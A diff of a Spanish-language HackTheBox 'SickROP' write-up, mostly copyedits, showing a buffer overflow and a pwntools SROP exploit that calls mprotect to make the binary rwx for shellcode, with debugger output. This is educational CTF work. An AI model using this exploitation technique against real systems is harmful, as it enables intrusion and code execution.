@@ -144,19 +144,19 @@
 <section class="post" id="reversing">
 <br><h3 class="post-title">Reversing</h3><br>
 
-<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/SickROP/sick_rop">binario</a> parece que espera una entrada donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, el programa devuelve lo que enviamos como entrada todas las veces que lo enviemos</p>
+<p class="plain-text">Si ejecutamos el <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/SickROP/sick_rop">binario</a> parece que espera una entrada donde enviamos <code class="language-plaintext highlighter-rouge">16 bytes</code>, el programa devuelve lo que enviamos como entrada todas las veces que lo enviemos.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ./sick_rop</span><span class="p">
-AAAAAAAABBBBBBBB  
-AAAAAAAABBBBBBBB  
-CCCCCCCCDDDDDDDD  
-CCCCCCCCDDDDDDDD  </span>
+AAAAAAAABBBBBBBB
+AAAAAAAABBBBBBBB
+CCCCCCCCDDDDDDDD
+CCCCCCCCDDDDDDDD</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al desensamblar el programa podemos ver que en verdad es muy simple, ni siquiera tiene un <code class="language-plaintext highlighter-rouge">main</code> inicia desde la función <code class="language-plaintext highlighter-rouge">_start</code> que llama a la función <code class="language-plaintext highlighter-rouge">vuln</code> en bucle</p>
+<p class="plain-text">Al desensamblar el programa podemos ver que en verdad es muy simple, ni siquiera tiene un <code class="language-plaintext highlighter-rouge">main</code> inicia desde la función <code class="language-plaintext highlighter-rouge">_start</code> que llama a la función <code class="language-plaintext highlighter-rouge">vuln</code> en bucle.</p>
 <a href="/challenges/sickrop/1.png" target="_blank"><div><p><img src="/challenges/sickrop/1.png"></p></div></a>
 
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> lee <code class="language-plaintext highlighter-rouge">0x300</code> bytes llamando a <code class="language-plaintext highlighter-rouge">read</code> en <code class="language-plaintext highlighter-rouge">rbp - 32</code>, el valor de retorno es la cantidad de bytes leidos, entonces llama a <code class="language-plaintext highlighter-rouge">write</code> para mostrar lo que se recibió</p>
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> lee <code class="language-plaintext highlighter-rouge">0x300</code> bytes llamando a <code class="language-plaintext highlighter-rouge">read</code> en <code class="language-plaintext highlighter-rouge">rbp - 32</code>, el valor de retorno es la cantidad de bytes leídos, entonces llama a <code class="language-plaintext highlighter-rouge">write</code> para mostrar lo que se recibió.</p>
 <a href="/challenges/sickrop/2.png" target="_blank"><div><p><img src="/challenges/sickrop/2.png"></p></div></a>
 
 </section>
@@ -164,7 +164,7 @@ CCCCCCCCDDDDDDDD  </span>
 <section class="post" id="exploitation">
 <br><h3 class="post-title">Explotación</h3><br>
 
-<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este no tiene ninguna a excepción del <code class="language-plaintext highlighter-rouge">NX</code> que evitará que podamos ejecutar <code class="language-plaintext highlighter-rouge">shellcode</code> directamente en el stack</p>
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, este no tiene ninguna, a excepción del <code class="language-plaintext highlighter-rouge">NX</code> que evitará que podamos ejecutar <code class="language-plaintext highlighter-rouge">shellcode</code> directamente en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">sick_rop
 [</span><span class="az">*</span><span class="p">] '/home/user/sick_rop'
@@ -172,14 +172,14 @@ CCCCCCCCDDDDDDDD  </span>
     RELRO:      </span><span class="ro">No RELRO</span><span class="p">
     Stack:      </span><span class="ro">No canary found</span><span class="p">
     NX:         </span><span class="ve">NX enabled</span><span class="p">
-    PIE:        </span><span class="ro">No PIE (0x400000)  </span>
+    PIE:        </span><span class="ro">No PIE (0x400000)</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">32 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que seran el valor de rbp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">32 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">rbp</code>, <code class="language-plaintext highlighter-rouge">8 B's</code> que serán el valor de rbp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que tomarán el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> -q
 >>> b"A" * 32 + b"B" * 8 + b"C" * 8 + b"D" * 24
-b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'  
+b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD'
 >>></span>
 </code></pre></div></div><br>
 
@@ -189,8 +189,8 @@ Reading symbols from </span><span class="ve">sick_rop</span><span class="p">...
 (No debugging symbols found in </span><span class="ve">sick_rop</span><span class="p">)
 </span><span class="ro">pwndbg></span><span class="p"> r
 Starting program: </span><span class="ve">/home/user/sick_rop</span><span class="p">
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD  
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDDDDDDDDDDDDDDDDD
 
 Program received signal SIGSEGV, Segmentation fault.
 </span><span class="az">0x000000000040104e</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()
@@ -203,17 +203,16 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> es <code class="language-plaintext highlighter-rouge">0x49</code>, la cantidad de bytes que se enviaron con el <code class="language-plaintext highlighter-rouge">\n</code></p>
+<p class="plain-text">El valor de retorno en <code class="language-plaintext highlighter-rouge">rax</code> es <code class="language-plaintext highlighter-rouge">0x49</code>, la cantidad de bytes que se enviaron con el <code class="language-plaintext highlighter-rouge">\n</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ro">pwndbg></span><span class="p"> p/x $rax  
+<code><span class="ro">pwndbg></span><span class="p"> p/x $rax
 </span><span class="az">$1 </span><span class="p">= 0x49
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque tenemos control del return address y podriamos ejecutar un ropchain los <code class="language-plaintext highlighter-rouge">gadgets</code> que existen en el binario son muy limitados y no nos sirven para cargar valores en registros, el único interesante es <code class="language-plaintext highlighter-rouge">syscall</code> que nos ayudará a explotarlo</p>
+<p class="plain-text">Aunque tenemos control del return address y podríamos ejecutar un ropchain los <code class="language-plaintext highlighter-rouge">gadgets</code> que existen en el binario son muy limitados y no nos sirven para cargar valores en registros, el único interesante es <code class="language-plaintext highlighter-rouge">syscall</code> que nos ayudará a explotarlo.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ropper</span><span class="p"> --file sick_rop --search </span><span class="am">'syscall; ret;'  </span><span class="p">
-</span><span class="ve">[INFO]</span><span class="p"> Load gadgets from cache
+<code><span class="ve">❯ ropper</span><span class="p"> --file sick_rop --search </span><span class="am">'syscall; ret;'</span><span class="p">
 </span><span class="ve">[LOAD]</span><span class="p"> loading... 100%
 </span><span class="ve">[LOAD]</span><span class="p"> removing double gadgets... 100%
 </span><span class="ve">[INFO]</span><span class="p"> Searching for gadgets: syscall; ret;
@@ -222,13 +221,13 @@ Program received signal SIGSEGV, Segmentation fault.
 </span><span class="ro">0x0000000000401014</span><span class="p">:</span><span class="am"> syscall</span><span class="az">;</span><span class="am"> ret</span><span class="az">;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque la dirección del stack es aleatoria podemos hacer que apunte a un punto del binario, pero deberemos cambiar los permisos de los <code class="language-plaintext highlighter-rouge">0x2000</code> bytes a <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code></p>
+<p class="plain-text">Aunque la dirección del stack es aleatoria podemos hacer que apunte a un punto del binario, pero deberemos cambiar los permisos de los <code class="language-plaintext highlighter-rouge">0x2000</code> bytes a <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">vmmap
 LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size Offset File
-          0x400000           0x401000 r--p     1000      0 /home/user/sick_rop  
-          </span><span class="ro">0x401000           0x402000 r-xp     1000   1000 /home/user/sick_rop  </span><span class="p">
+          0x400000           0x401000 r--p     1000      0 /home/user/sick_rop
+          </span><span class="ro">0x401000           0x402000 r-xp     1000   1000 /home/user/sick_rop</span><span class="p">
     0x7ffff7ff9000     0x7ffff7ffd000 r--p     4000      0 [vvar]
     </span><span class="ro">0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000      0 [vdso]</span><span class="p">
     </span><span class="am">0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><span class="p">
@@ -236,33 +235,33 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">La tecnica que utilizaremos será un <a href="https://rog3rsm1th.github.io/posts/sigreturn-oriented-programming/#-how-does-it-works">SROP</a>, para ello necesitaremos un par de cosas, la primera es un gadget <code class="language-plaintext highlighter-rouge">syscall; ret;</code> y la segunda es cargar en el registro <code class="language-plaintext highlighter-rouge">rax</code> el valor <code class="language-plaintext highlighter-rouge">0xf</code> que es el syscall NR de la función <code class="language-plaintext highlighter-rouge">sigreturn</code>, el registro <code class="language-plaintext highlighter-rouge">rax</code> lo controlamos con el valor de retorno que es la longitud, al enviar <code class="language-plaintext highlighter-rouge">0xf</code> bytes se almacenara en <code class="language-plaintext highlighter-rouge">rax</code></p>
+<p class="plain-text">La técnica que utilizaremos será un <a href="https://rog3rsm1th.github.io/posts/sigreturn-oriented-programming/#-how-does-it-works">SROP</a>, para ello necesitaremos un par de cosas, la primera es un gadget <code class="language-plaintext highlighter-rouge">syscall; ret;</code> y la segunda es cargar en el registro <code class="language-plaintext highlighter-rouge">rax</code> el valor <code class="language-plaintext highlighter-rouge">0xf</code> que es el syscall NR de la función <code class="language-plaintext highlighter-rouge">sigreturn</code>, el registro <code class="language-plaintext highlighter-rouge">rax</code> lo controlamos con el valor de retorno que es la longitud, al enviar <code class="language-plaintext highlighter-rouge">0xf</code> bytes se almacenará en <code class="language-plaintext highlighter-rouge">rax</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
-payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0xf</span><span class="c1">    # len = sigreturn()  </span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0xf</span><span class="c1">    # len = sigreturn()</span><span class="p">
 
 shell.send(payload)
 shell.recv()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Las pwntools nos hace el proceso del <a href="https://docs.pwntools.com/en/stable/rop/srop.html">SROP</a> mas sencillo asi que creamos un <code class="language-plaintext highlighter-rouge">frame</code> y asignamos los valores que queremos que tengan los registros, nuestra idea será llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los privilegios del binario, entonces almacenamos en <code class="language-plaintext highlighter-rouge">rax</code> el valor <code class="language-plaintext highlighter-rouge">0xa</code> que es su syscall number y en <code class="language-plaintext highlighter-rouge">rip</code> el gadget de <code class="language-plaintext highlighter-rouge">syscall; ret;</code></p>
+<p class="plain-text">Las pwntools nos hacen el proceso del <a href="https://docs.pwntools.com/en/stable/rop/srop.html">SROP</a> mas sencillo así que creamos un <code class="language-plaintext highlighter-rouge">frame</code> y asignamos los valores que queremos que tengan los registros, nuestra idea será llamar a <code class="language-plaintext highlighter-rouge">mprotect</code> para cambiar los privilegios del binario, entonces almacenamos en <code class="language-plaintext highlighter-rouge">rax</code> el valor <code class="language-plaintext highlighter-rouge">0xa</code> que es su syscall number y en <code class="language-plaintext highlighter-rouge">rip</code> el gadget de <code class="language-plaintext highlighter-rouge">syscall; ret;</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">frame </span><span class="o">= </span><span class="p">SigreturnFrame(</span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
 frame.rax</span><span class="o"> =</span><span class="mi"> 0xa</span><span class="c1">          # mprotect()</span><span class="p">
-frame.rip</span><span class="o"> =</span><span class="mi"> 0x401014</span><span class="c1">     # syscall; ret;  </span>
+frame.rip</span><span class="o"> =</span><span class="mi"> 0x401014</span><span class="c1">     # syscall; ret;</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El primer argumento en <code class="language-plaintext highlighter-rouge">rdi</code> será la dirección base del binario, en <code class="language-plaintext highlighter-rouge">rsi</code> la longitud que serán <code class="language-plaintext highlighter-rouge">0x2000</code> bytes y finalmente en <code class="language-plaintext highlighter-rouge">rdx</code> la protección que es <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code></p>
+<p class="plain-text">El primer argumento en <code class="language-plaintext highlighter-rouge">rdi</code> será la dirección base del binario, en <code class="language-plaintext highlighter-rouge">rsi</code> la longitud que serán <code class="language-plaintext highlighter-rouge">0x2000</code> bytes y finalmente en <code class="language-plaintext highlighter-rouge">rdx</code> la protección que es <code class="language-plaintext highlighter-rouge">7</code> o <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">frame.rdi</span><span class="o"> =</span><span class="mi"> 0x400000</span><span class="c1">     # base address  </span><span class="p">
+<code><span class="p">frame.rdi</span><span class="o"> =</span><span class="mi"> 0x400000</span><span class="c1">     # base address</span><span class="p">
 frame.rsi</span><span class="o"> =</span><span class="mi"> 0x2000</span><span class="c1">       # len</span><span class="p">
 frame.rdx</span><span class="o"> =</span><span class="mi"> 0x7</span><span class="c1">          # prot</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Nuestra idea será redirigir el <code class="language-plaintext highlighter-rouge">ret</code> luego de la <code class="language-plaintext highlighter-rouge">syscall</code>, entonces en <code class="language-plaintext highlighter-rouge">rsp</code> podemos almacenar una dirección que contenta la dirección de la función <code class="language-plaintext highlighter-rouge">vuln</code>, asi retornará nuevamente al bucle y como el stack ahora está en el binario tenemos <code class="language-plaintext highlighter-rouge">rwx</code></p>
+<p class="plain-text">Nuestra idea será redirigir el <code class="language-plaintext highlighter-rouge">ret</code> luego de la <code class="language-plaintext highlighter-rouge">syscall</code>, entonces en <code class="language-plaintext highlighter-rouge">rsp</code> podemos almacenar una dirección que contenta la dirección de la función <code class="language-plaintext highlighter-rouge">vuln</code>, asi retornará nuevamente al bucle y como el stack ahora está en el binario tenemos <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> p vuln
-</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>} </span><span class="az">0x40102e</span><span class="p"> &lt</span><span class="am">vuln</span><span class="p">>  
+</span><span class="az">$1</span><span class="p"> = {&lttext variable, no debug info>} </span><span class="az">0x40102e</span><span class="p"> &lt</span><span class="am">vuln</span><span class="p">>
 </span><span class="ro">pwndbg></span><span class="p"> search -t qword 0x40102e
 Searching for value: b'.\x10@\x00\x00\x00\x00\x00'
 </span><span class="ro">sick_rop        0x4010d8</span><span class="na"> adc</span><span class="no"> byte ptr cs</span><span class="p">:[</span><span class="no">rax</span><span class="p">], </span><span class="no">al</span><span class="p">
@@ -272,15 +271,15 @@ Searching for value: b'.\x10@\x00\x00\x00\x00\x00'
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">frame.rsp </span><span class="o">=</span><span class="mi"> 0x4010d8</span><span class="c1">     # &vuln()  </span>
+<code><span class="p">frame.rsp </span><span class="o">=</span><span class="mi"> 0x4010d8</span><span class="c1">     # &vuln()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces, primero enviamos un payload que rellena con <code class="language-plaintext highlighter-rouge">A's</code> hasta el return address, ahi llamaremos a la función <code class="language-plaintext highlighter-rouge">vuln</code> donde enviaremos <code class="language-plaintext highlighter-rouge">0xf</code> bytes asi el valor de retorno sera el syscall number de <code class="language-plaintext highlighter-rouge">sigreturn</code>, al retornar ejecutará un <code class="language-plaintext highlighter-rouge">syscall; ret;</code> que ejecutará el frame que creamos y llamará a <code class="language-plaintext highlighter-rouge">mprotect</code> modificando asi los privilegios</p>
+<p class="plain-text">Entonces, primero enviamos un payload que rellena con <code class="language-plaintext highlighter-rouge">A's</code> hasta el return address, ahi llamaremos a la función <code class="language-plaintext highlighter-rouge">vuln</code> donde enviaremos <code class="language-plaintext highlighter-rouge">0xf</code> bytes asi el valor de retorno sera el syscall number de <code class="language-plaintext highlighter-rouge">sigreturn</code>, al retornar ejecutará un <code class="language-plaintext highlighter-rouge">syscall; ret;</code> que ejecutará el frame que creamos y llamará a <code class="language-plaintext highlighter-rouge">mprotect</code> modificando asi los privilegios.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p64, SigreturnFrame
 
-shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./sick_rop"</span><span class="p">,</span><span class="s"> "b *vuln+32</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./sick_rop"</span><span class="p">,</span><span class="s"> "b *vuln+32</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)
 
 offset</span><span class="o"> =</span><span class="mi"> 40</span><span class="p">
 junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
@@ -311,9 +310,9 @@ shell.recv()
 shell.interactive()</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Veamos como funciona nuestro exploit desde el debugger, al llegar al breakpoint del primer <code class="language-plaintext highlighter-rouge">ret</code> llamará a la función <code class="language-plaintext highlighter-rouge">vuln</code> y luego ejecutará el gadget <code class="language-plaintext highlighter-rouge">syscall; ret;</code></p>
+<p class="plain-text">Veamos como funciona nuestro exploit desde el debugger, al llegar al breakpoint del primer <code class="language-plaintext highlighter-rouge">ret</code> llamará a la función <code class="language-plaintext highlighter-rouge">vuln</code> y luego ejecutará el gadget <code class="language-plaintext highlighter-rouge">syscall; ret;</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">Breakpoint 1,</span><span class="az"> 0x000000000040104e </span><span class="p">in</span><span class="am"> vuln</span><span class="p"> ()  
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x000000000040104e </span><span class="p">in</span><span class="am"> vuln</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $rip
 =></span><span class="az"> 0x40104e </span><span class="p">&lt</span><span class="am">vuln</span><span class="p">+32>:</span><span class="ve">  ret
 </span><span class="ro">pwndbg></span><span class="p"> x/i *(long long *)($rsp + 0)
@@ -324,11 +323,11 @@ pwndbg></span><span class="p"> x/2i *(long long *)($rsp + 8)
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando llamamos a <code class="language-plaintext highlighter-rouge">vuln</code> y enviamos <code class="language-plaintext highlighter-rouge">0xf</code> bytes, cuando llegamos al gadget que sigue después de la función en el registro <code class="language-plaintext highlighter-rouge">rax</code> almacena el valor de retorno que es la cantidad de bytes recibidos que son <code class="language-plaintext highlighter-rouge">0xf</code>, el mismo syscall number de <code class="language-plaintext highlighter-rouge">sigreturn</code></p>
+<p class="plain-text">Cuando llamamos a <code class="language-plaintext highlighter-rouge">vuln</code> y enviamos <code class="language-plaintext highlighter-rouge">0xf</code> bytes, y luego llegamos al gadget que sigue después de la función en el registro <code class="language-plaintext highlighter-rouge">rax</code> almacena el valor de retorno que es la cantidad de bytes recibidos que son <code class="language-plaintext highlighter-rouge">0xf</code>, el mismo syscall number de <code class="language-plaintext highlighter-rouge">sigreturn</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> nextret
-Temporary breakpoint -1,</span><span class="az"> 0x0000000000401040</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()  
-Temporary breakpoint -2,</span><span class="az"> 0x0000000000401048</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()  
+Temporary breakpoint -1,</span><span class="az"> 0x0000000000401040</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()
+Temporary breakpoint -2,</span><span class="az"> 0x0000000000401048</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()
 
 Breakpoint 1,</span><span class="az"> 0x000000000040104e</span><span class="p"> in</span><span class="am"> vuln</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> ni
@@ -340,12 +339,12 @@ Breakpoint 1,</span><span class="az"> 0x000000000040104e</span><span class="p"> 
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">syscall</code> salta al frame que intentará ejecutar la <code class="language-plaintext highlighter-rouge">syscall</code> de la función <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de <code class="language-plaintext highlighter-rouge">0x2000</code> bytes del binario a <code class="language-plaintext highlighter-rouge">rwx</code></p>
+<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">syscall</code> salta al frame que intentará ejecutar la <code class="language-plaintext highlighter-rouge">syscall</code> de la función <code class="language-plaintext highlighter-rouge">mprotect</code> para modificar los permisos de <code class="language-plaintext highlighter-rouge">0x2000</code> bytes del binario a <code class="language-plaintext highlighter-rouge">rwx</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> ni
 </span><span class="az">0x0000000000401014 </span><span class="p">in</span><span class="am"> read</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> x/i $rip
-=></span><span class="az"> 0x401014</span><span class="p"> &lt</span><span class="am">read</span><span class="p">+20>:</span><span class="ve">  syscall  
+=></span><span class="az"> 0x401014</span><span class="p"> &lt</span><span class="am">read</span><span class="p">+20>:</span><span class="ve">  syscall
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rax
 </span><span class="az">$2</span><span class="p"> = 0xa
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rdi
@@ -357,15 +356,15 @@ Breakpoint 1,</span><span class="az"> 0x000000000040104e</span><span class="p"> 
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Luego de ejecutar la llamada a <code class="language-plaintext highlighter-rouge">mprotect</code> el binario posee privilegios <code class="language-plaintext highlighter-rouge">rwx</code> por lo que podemos ejecutar un shellcode que podamos guardar en cualquier parte de él</p>
+<p class="plain-text">Luego de ejecutar la llamada a <code class="language-plaintext highlighter-rouge">mprotect</code> el binario posee privilegios <code class="language-plaintext highlighter-rouge">rwx</code> por lo que podemos ejecutar un shellcode que podamos guardar en cualquier parte de él.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> ni
 </span><span class="az">0x0000000000401016 </span><span class="p">in</span><span class="am"> read</span><span class="p"> ()
 </span><span class="ro">pwndbg></span><span class="p"> vmmap
 LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> |</span><span class="ro"> CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> | RODATA
              Start                End Perm     Size Offset File
-</span><span class="ro">          0x400000           0x401000 rwxp     1000      0 /home/user/sick_rop  
-          0x401000           0x402000 rwxp     1000   1000 /home/user/sick_rop  
+</span><span class="ro">          0x400000           0x401000 rwxp     1000      0 /home/user/sick_rop
+          0x401000           0x402000 rwxp     1000   1000 /home/user/sick_rop
 </span><span class="am">    0x7ffc09035000     0x7ffc09056000 rw-p    21000      0 [stack]
 </span><span class="p">    0x7ffc09089000     0x7ffc0908d000 r--p     4000      0 [vvar]
 </span><span class="ro">    0x7ffc0908d000     0x7ffc0908f000 r-xp     2000      0 [vdso]
@@ -373,30 +372,30 @@ LEGEND:</span><span class="am"> STACK</span><span class="p"> |</span><span class
 pwndbg></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Cuando apuntamos al siguiente <code class="language-plaintext highlighter-rouge">ret</code> el frame indica que el registro <code class="language-plaintext highlighter-rouge">rsp</code> apunta a una dirección en el binario que es una referencia a la dirección de la función <code class="language-plaintext highlighter-rouge">vuln</code></p>
+<p class="plain-text">Cuando apuntamos al siguiente <code class="language-plaintext highlighter-rouge">ret</code> el frame indica que el registro <code class="language-plaintext highlighter-rouge">rsp</code> apunta a una dirección en el binario que es una referencia a la dirección de la función <code class="language-plaintext highlighter-rouge">vuln</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg></span><span class="p"> x/i $rip
 =></span><span class="az"> 0x401016</span><span class="p"> &lt</span><span class="am">read</span><span class="p">+22>:  </span><span class="ve">ret</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> p/x $rsp
 </span><span class="az">$6</span><span class="p"> = 0x4010d8
 </span><span class="ro">pwndbg></span><span class="p"> x/i *(long long *)($rsp)
-   </span><span class="az">0x40102e</span><span class="p"> &lt</span><span class="am">vuln</span><span class="p">>:     </span><span class="ve">push</span><span class="ro">   rbp</span><span class="p">  
+   </span><span class="az">0x40102e</span><span class="p"> &lt</span><span class="am">vuln</span><span class="p">>:     </span><span class="ve">push</span><span class="ro">   rbp</span><span class="p">
 </span><span class="ro">pwndbg></span><span class="p"> c
 Continuando.</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Entonces como nuevamente se retorna a la función <code class="language-plaintext highlighter-rouge">vuln</code> ahora podemos enviar un total de <code class="language-plaintext highlighter-rouge">40 A's</code> que es el offset del return address donde apuntaremos a <code class="language-plaintext highlighter-rouge">8 B's</code></p>
+<p class="plain-text">Entonces como nuevamente se retorna a la función <code class="language-plaintext highlighter-rouge">vuln</code> ahora podemos enviar un total de <code class="language-plaintext highlighter-rouge">40 A's</code> que es el offset del return address donde apuntaremos a <code class="language-plaintext highlighter-rouge">8 B's</code>.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
 [</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 166333
-[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './sick_rop']  
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './sick_rop']
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Aunque en el binario no existe un gadget <code class="language-plaintext highlighter-rouge">jmp rsp</code> como modificamos el <code class="language-plaintext highlighter-rouge">rsp</code> hacia una parte del binario ahora el inicio de nuestro buffer ahora se guarda en la dirección estática <code class="language-plaintext highlighter-rouge">0x4010b8</code> por lo que podemos apuntar ahi para ejecutar un shellcode</p>
